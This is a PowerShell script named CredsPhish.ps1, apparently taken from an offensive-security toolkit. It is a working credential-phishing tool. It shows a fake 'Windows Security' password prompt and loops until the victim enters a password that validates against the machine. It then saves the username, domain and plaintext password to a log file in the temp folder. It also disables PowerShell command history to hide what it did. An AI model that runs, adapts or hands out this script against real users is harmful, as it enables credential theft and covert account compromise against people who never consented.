<#
.SYNOPSIS
   Promp the current user for a valid credential.

   Author: @mubix|@r00t-3xp10it
   Tested Under: Windows 10 (18363) x64 bits
   Required Dependencies: none
   Optional Dependencies: BitsTransfer
   PS cmdlet Dev version: v1.2.5

.DESCRIPTION
   This CmdLet interrupts EXPLORER process until a valid credential is entered
   correctly in Windows PromptForCredential MsgBox, only them it starts EXPLORER
   process and leaks the credentials on this terminal shell (Social Engineering).

.NOTES
   Remark: This cmdlet no longer checks creds againts DC (does not validate then)

.Parameter PhishCreds
   Accepts arguments: Start (default: Start)

.EXAMPLE
   PS C:\> .\CredsPhish.ps1 -PhishCreds start
   Prompt the current user for a valid credential.

.OUTPUTS
   UserName Domain Password
   -------- ------ --------
   pedro    SKYNET ujhho
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$UserAccount=$([Environment]::UserName),
   [string]$PhishCreds="Start"
)


$account = $null
$PCName = $Env:COMPUTERNAME
$ErrorActionPreference = "SilentlyContinue"
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null

If($PhishCreds -ieq "Start")
{
   Write-Host ""
   $cred = ($Host.ui.PromptForCredential("WindowsSecurity", "Please enter user credentials", "$Env:USERDOMAIN\$Env:USERNAME",""))
   $username = "$Env:USERNAME";$domain = "$Env:USERDOMAIN";$full = "$domain" + "\" + "$username"
   $password = $cred.GetNetworkCredential().password
   Add-Type -assemblyname System.DirectoryServices.AccountManagement
   $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
   while($DS.ValidateCredentials("$full", "$password") -ne $True){
       $cred = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
       $username = "$Env:USERNAME"
       $domain = "$Env:USERDOMAIN"
       $full = "$domain" + "\" + "$username"
       $password = $cred.GetNetworkCredential().password
       Add-Type -assemblyname System.DirectoryServices.AccountManagement
       $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
       $DS.ValidateCredentials("$full", "$password") | out-null
       }
     
     $output = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
     echo $output|Out-File "$Env:TMP\creds.log" -encoding ascii -force
}